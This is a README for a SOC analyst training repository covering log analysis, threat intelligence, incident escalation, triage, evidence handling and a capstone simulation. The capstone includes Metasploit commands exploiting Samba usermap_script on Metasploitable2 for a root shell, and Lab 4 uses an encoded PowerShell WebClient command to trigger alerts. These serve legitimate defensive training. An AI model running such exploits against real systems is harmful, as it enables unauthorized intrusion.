# cyart-soc-team-
 # 🛡️ SOC Analyst Practical Labs

> **Security Operations Center Training — Complete Lab Submission**  
> Covering Advanced Log Analysis, Threat Intelligence Integration, Incident Escalation, Alert Triage, Evidence Preservation, and a Full SOC Workflow Capstone.

---

## 📁 Repository Structure

```
soc-analyst-labs/
│
├── README.md                          ← You are here
│
├── docs/
│   ├── SOC_Theory_Guide.pdf           ← Theoretical knowledge (Topics 1–3)
│   ├── SOC_Lab_Report.docx            ← Full lab report with all tables & findings
│   ├── SOC_Lab_Documentation_Screenshots.docx  ← Screenshot evidence document
│   ├── SOC_Lab_Procedures.docx        ← Step-by-step procedure guide
│   └── SOC_Lab_Workbook.xlsx          ← Data tables (Google Sheets compatible)
│
├── lab1-log-analysis/
│   ├── README.md                      ← Lab 1 specific steps
│   ├── docker-compose.yml             ← Elastic Stack setup
│   ├── geoip-pipeline.json            ← GeoIP ingest pipeline config
│   ├── anomaly-detection-rule.json    ← Elastic detection rule export
│   └── screenshots/                  ← Lab 1 screenshot evidence
│       ├── 1.1-docker-ps.png
│       ├── 1.2-kibana-home.png
│       ├── 1.3-dataset-uploaded.png
│       ├── 1.4-correlation-query.png
│       ├── 1.5-rule-config.png
│       ├── 1.6-rule-active.png
│       ├── 1.7-geoip-pipeline.png
│       └── 1.8-geoip-output.png
│
├── lab2-threat-intelligence/
│   ├── README.md                      ← Lab 2 specific steps
│   ├── otx-integration-config.xml     ← Wazuh OTX integration snippet
│   ├── otx-cdb-rule.xml               ← Wazuh CDB detection rule
│   ├── threat-hunt-queries.txt        ← T1078 hunt queries
│   └── screenshots/
│       ├── 2.1-wazuh-otx-config.png
│       ├── 2.2-mock-ip-alert.png
│       ├── 2.3-otx-reputation.png
│       └── 2.4-threat-hunt-results.png
│
├── lab3-incident-escalation/
│   ├── README.md                      ← Lab 3 specific steps
│   ├── sitrep-inc-2025-001.md         ← SITREP markdown version
│   ├── phantom-playbook-logic.md      ← Phantom playbook description
│   └── screenshots/
│       ├── 3.1-thehive-new-case.png
│       ├── 3.2-observable-added.png
│       ├── 3.3-escalated-tier2.png
│       ├── 3.4-sitrep-google-docs.png
│       ├── 3.5-phantom-playbook.png
│       └── 3.6-playbook-test.png
│
├── lab4-alert-triage/
│   ├── README.md                      ← Lab 4 specific steps
│   └── screenshots/
│       ├── 4.1-powershell-alert.png
│       ├── 4.2-virustotal-results.png
│       └── 4.3-otx-indicator.png
│
├── lab5-evidence-preservation/
│   ├── README.md                      ← Lab 5 specific steps
│   ├── netstat-query.vql              ← Velociraptor VQL query
│   └── screenshots/
│       ├── 5.1-velociraptor-netstat.png
│       ├── 5.2-memory-acquisition.png
│       └── 5.3-sha256-hashes.png
│
└── lab6-capstone/
    ├── README.md                      ← Capstone specific steps
    ├── incident-report-inc-2025-002.md ← Final incident report
    └── screenshots/
        ├── 6.1-metasploit-exploit.png
        ├── 6.2-wazuh-detection.png
        ├── 6.3-crowdsec-block.png
        ├── 6.4-thehive-critical-case.png
        └── 6.5-incident-report.png
```

---

## 🚀 Quick Start — Lab Environment Setup

### Prerequisites

- **Host OS**: Kali Linux (recommended) or Ubuntu 22.04+
- **RAM**: Minimum 8 GB (16 GB recommended for capstone)
- **Docker**: v24.0+ and Docker Compose v2.0+

### 1. Install Docker

```bash
sudo apt update && sudo apt install docker.io docker-compose-plugin -y
sudo systemctl enable docker && sudo systemctl start docker
sudo usermod -aG docker $USER   # Re-login after this
```

### 2. Start Elastic Stack (Labs 1 & 4)

```bash
cd lab1-log-analysis/
docker compose up -d
docker ps   # Verify both containers running
```

Open Kibana: **http://localhost:5601**

### 3. Wazuh Setup (Labs 2, 4, 6)

Follow the official Wazuh all-in-one installer:

```bash
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash wazuh-install.sh -a
```

Dashboard: **https://localhost** (default creds in installer output)

### 4. TheHive Setup (Labs 3, 6)

```bash
docker run -d --name thehive -p 9000:9000 strangebee/thehive:latest
```

Open TheHive: **http://localhost:9000**  
Default credentials: `admin@thehive.local` / `secret` — **change immediately**

---

## 📚 Labs Overview

| # | Lab | Tools | Key Deliverable |
|---|-----|-------|-----------------|
| 1 | Advanced Log Analysis | Elastic, Kibana | Correlation table, detection rule, GeoIP enrichment |
| 2 | Threat Intelligence Integration | Wazuh, OTX, TheHive | IOC feed import, alert enrichment, T1078 hunt |
| 3 | Incident Escalation Practice | TheHive, Phantom | SITREP, TheHive case, automated playbook |
| 4 | Alert Triage | Wazuh, VirusTotal, OTX | Triage log, IOC validation, 50-word finding |
| 5 | Evidence Preservation | Velociraptor, FTK Imager | Chain of custody, memory dump, SHA256 hashes |
| 6 | Capstone: Full SOC Workflow | Metasploit, Wazuh, CrowdSec, TheHive | End-to-end simulation, incident report |

---

## 🔬 Lab 1 — Advanced Log Analysis

### Objective
Correlate security logs, detect anomalies, and enrich with GeoIP data using Elastic Stack.

### docker-compose.yml

```yaml
version: "3"
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.13.0
    container_name: elasticsearch
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - ES_JAVA_OPTS=-Xms1g -Xmx1g
    ports:
      - "9200:9200"

  kibana:
    image: docker.elastic.co/kibana/kibana:8.13.0
    container_name: kibana
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch
```

### Key Queries

```kql
# Failed logins correlated with DNS:
event.code:4625 AND destination.port:53

# Large outbound transfers (anomaly detection):
network.bytes > 1048576

# HTTP errors in Apache logs:
http.response.status_code >= 400
```

### GeoIP Pipeline

```bash
# Stack Management > Ingest Pipelines > Create pipeline
# Name: geoip-pipeline
# Add Processor: GeoIP
# Field: source.address → Target: source.geo
```

Test document:
```json
[{ "_source": { "source": { "address": "8.8.8.8" } } }]
```

Expected output: `source.geo.country_name: "United States"`, `city_name: "Mountain View"`

---

## 🧠 Lab 2 — Threat Intelligence Integration

### Objective
Import OTX threat feeds into Wazuh, enrich alerts with reputation data, hunt for T1078.

### OTX Integration Config (add to ossec.conf)

```xml
<integration>
  <name>otx</name>
  <api_key>YOUR_OTX_API_KEY_HERE</api_key>
  <alert_format>json</alert_format>
</integration>
```

### Test with Mock Malicious IP

```bash
# On Wazuh agent machine:
logger "Failed login attempt from 192.168.1.100"

# Verify in Wazuh Dashboard:
# Security Events > Search: 192.168.1.100
```

### T1078 Threat Hunt Queries

```kql
# Non-system user logins:
user.name:* AND NOT user.name:system

# Logins from outside corporate network:
event.action:logged-in AND NOT source.ip:192.168.0.0/16

# MITRE-tagged alerts:
rule.mitre.technique:T1078
```

---

## 📋 Lab 3 — Incident Escalation Practice

### Objective
Create a TheHive case, draft a SITREP, and automate escalation with Splunk Phantom.

### TheHive Case Details — INC-2025-001

| Field | Value |
|-------|-------|
| Title | Unauthorized Access on Server-Y |
| Severity | High |
| TLP | Amber |
| Source IP | 192.168.1.200 |
| MITRE | T1078 — Valid Accounts |
| Assigned To | Tier 2 Analyst |

### SITREP Template

```
Title: Unauthorized Access on Server-Y — INC-2025-001
Detected: 2025-08-18 13:00 UTC
Source IP: 192.168.1.200
MITRE: T1078 — Valid Accounts
Severity: High

Summary:
Unauthorized access was detected on Server-Y via valid credentials from an 
unexpected source IP outside business hours. Anomalous behavior including a 
privilege escalation attempt was observed.

Actions Taken:
1. Server-Y isolated from network
2. Memory dump collected (EVD-001)
3. TheHive case created — INC-2025-001
4. Escalated to Tier 2 for forensic analysis
5. Source IP blocked via CrowdSec

Recommendations:
- Reset potentially compromised credentials
- Enforce MFA on all privileged accounts
- Review VPN logs for lateral movement indicators
```

---

## 🔍 Lab 4 — Alert Triage with Threat Intelligence

### Objective
Triage a suspicious PowerShell execution alert and validate IOCs via VirusTotal and OTX.

### Simulate Alert

```bash
# On Windows VM (PowerShell Admin):
powershell.exe -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=

# OR on Linux Wazuh agent:
logger "Suspicious PowerShell execution from 192.168.1.101"
```

### IOC Validation Steps

1. **VirusTotal**: https://www.virustotal.com/gui/home/search → paste IP or hash
2. **OTX**: https://otx.alienvault.com/indicator/ip/192.168.1.101
3. **Verdict**: >10 VT detections + OTX pulses = **MALICIOUS**

---

## 🗂️ Lab 5 — Evidence Preservation

### Velociraptor VQL Queries

```sql
-- Active network connections:
SELECT Pid, FamilyString, Status, Laddr.IP, Laddr.Port, Raddr.IP, Raddr.Port
FROM netstat()

-- Running processes:
SELECT Pid, Ppid, Name, Exe, CommandLine, Username, CreateTime
FROM pslist()

-- Memory acquisition:
SELECT * FROM Artifact.Windows.Memory.Acquisition()
```

### Hash Evidence

```bash
sha256sum memory_dump.raw        # Hash memory dump
sha256sum netstat_export.csv     # Hash CSV evidence
sha256sum prefetch_files.zip     # Hash any archived evidence
```

### Chain of Custody Format

| Item | Description | Collected By | Date | SHA-256 |
|------|-------------|--------------|------|---------|
| EVD-001 | Memory Dump | SOC Analyst | 2025-08-18 | `<hash>` |
| EVD-002 | Netstat CSV | SOC Analyst | 2025-08-18 | `<hash>` |
| EVD-003 | Prefetch Archive | SOC Analyst | 2025-08-18 | `<hash>` |

---

## ⚔️ Lab 6 — Capstone: Full SOC Workflow Simulation

> ⚠️ **Lab environment only. Never run these commands outside your isolated VM network.**

### Attack Simulation (Metasploit)

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.X    # Metasploitable2 IP
set LHOST  192.168.1.Y    # Your Kali IP
exploit
# Verify: whoami → should return root
```

### Containment (CrowdSec)

```bash
# Block attacker IP:
sudo cscli decisions add --ip 192.168.1.101 --type ban --duration 24h --reason "Samba exploit"

# Verify block:
sudo cscli decisions list
ping 192.168.1.101   # Should timeout
```

### Detection Log

| Timestamp | Source IP | Alert | MITRE Technique | Severity |
|-----------|-----------|-------|-----------------|----------|
| 2025-08-18 14:00 | 192.168.1.101 | Samba usermap_script exploit | T1210 | Critical |
| 2025-08-18 14:01 | 192.168.1.101 | Shell spawned from smbd | T1059 | Critical |
| 2025-08-18 14:03 | 192.168.1.101 | Reverse shell port 4444 | T1071 | High |
| 2025-08-18 14:05 | 192.168.1.101 | Privilege escalation (root) | T1068 | Critical |

---

## ✅ Submission Checklist

### Lab 1
- [ ] Docker containers running (screenshot)
- [ ] Log dataset uploaded in Kibana (screenshot)
- [ ] Correlation query with results (screenshot + table)
- [ ] Anomaly detection rule Active (screenshot)
- [ ] GeoIP pipeline created and tested (screenshot)
- [ ] 50-word GeoIP finding written

### Lab 2
- [ ] OTX integration configured in Wazuh (screenshot)
- [ ] Mock malicious IP alert generated (screenshot)
- [ ] OTX reputation check captured (screenshot)
- [ ] Alert enrichment table completed
- [ ] T1078 threat hunt query results (screenshot)
- [ ] 50-word threat hunt finding written

### Lab 3
- [ ] TheHive case INC-2025-001 created (screenshot)
- [ ] Observable IP 192.168.1.200 added (screenshot)
- [ ] Case escalated to Tier 2 (screenshot)
- [ ] SITREP in Google Docs (screenshot + link)
- [ ] Phantom playbook created (screenshot)
- [ ] Playbook test successful (screenshot)

### Lab 4
- [ ] PowerShell alert in Wazuh (screenshot)
- [ ] Triage log table completed
- [ ] VirusTotal IOC check (screenshot)
- [ ] OTX IOC check (screenshot)
- [ ] IOC validation table completed
- [ ] 50-word finding written

### Lab 5
- [ ] Velociraptor netstat query results (screenshot)
- [ ] Memory acquisition completed (screenshot)
- [ ] SHA-256 hashes recorded for all 3 items
- [ ] Chain of custody table completed

### Lab 6
- [ ] Metasploit exploit executed (screenshot)
- [ ] Wazuh detection alerts confirmed (screenshot)
- [ ] CrowdSec IP ban applied (screenshot)
- [ ] Ping test confirming block (screenshot)
- [ ] TheHive Critical case created (screenshot)
- [ ] 200-word incident report in Google Docs
- [ ] 100-word non-technical manager briefing

---

## 📎 Submitted Files

| File | Description |
|------|-------------|
| `SOC_Theory_Guide.pdf` | Theoretical knowledge — Log Analysis, Threat Intel, Escalation Workflows |
| `SOC_Lab_Report.docx` | Full lab report with all data tables and findings |
| `SOC_Lab_Documentation_Screenshots.docx` | Screenshot evidence document with labeled spaces |
| `SOC_Lab_Procedures.docx` | Complete step-by-step procedure guide |
| `SOC_Lab_Workbook.xlsx` | All data tables — Google Sheets compatible |

---

## 🔗 References

| Resource | URL |
|----------|-----|
| MITRE ATT&CK | https://attack.mitre.org |
| NIST SP 800-61 | https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf |
| Elastic Documentation | https://www.elastic.co/guide |
| Wazuh Documentation | https://documentation.wazuh.com |
| AlienVault OTX | https://otx.alienvault.com |
| VirusTotal | https://www.virustotal.com |
| TheHive Project | https://docs.strangebee.com/thehive |
| Velociraptor Docs | https://docs.velociraptor.app |
| Metasploit Unleashed | https://www.offensive-security.com/metasploit-unleashed |
| SANS Reading Room | https://www.sans.org/reading-room |
| Boss of the SOC Dataset | https://github.com/splunk/botsv3 |

---

*SOC Analyst Practical Labs — Security Operations Center Training Program — August 2025*
